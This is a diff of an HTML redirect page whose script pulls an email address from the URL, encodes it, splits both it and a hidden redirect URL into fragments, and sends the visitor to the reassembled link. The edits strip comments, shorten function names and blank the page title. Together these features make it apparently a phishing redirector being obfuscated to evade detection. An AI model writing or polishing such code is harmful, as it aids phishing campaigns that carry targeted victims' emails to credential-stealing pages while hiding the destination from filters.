@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instant Redirect</title>
+  <title>...</title>
   <script>
     // Function to break a string into bits
-    function breakIntoBits(str, bits = 20) {
+    function bIB(str, bits = 20) {
       const bitLength = Math.ceil(str.length / bits);
       const result = [];
       for (let i = 0; i < bits; i++) {
@@ -15,12 +15,10 @@
       return result;
     }
 
-    // Function to combine bits into a string
     function combineBits(bits) {
       return bits.join("");
     }
 
-    // Function to extract email, encode it, and redirect
     function encodeEmailAndRedirect() {
       // Get the full URL
       const urlParams = new URLSearchParams(window.location.search);
@@ -38,7 +36,7 @@
         ];
 
         // Break the encoded email into 20 bits
-        const emailBits = breakIntoBits(encodedEmail);
+        const emailBits = bIB(encodedEmail);
 
         // Combine all bits (redirect URL + encoded email)
         const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
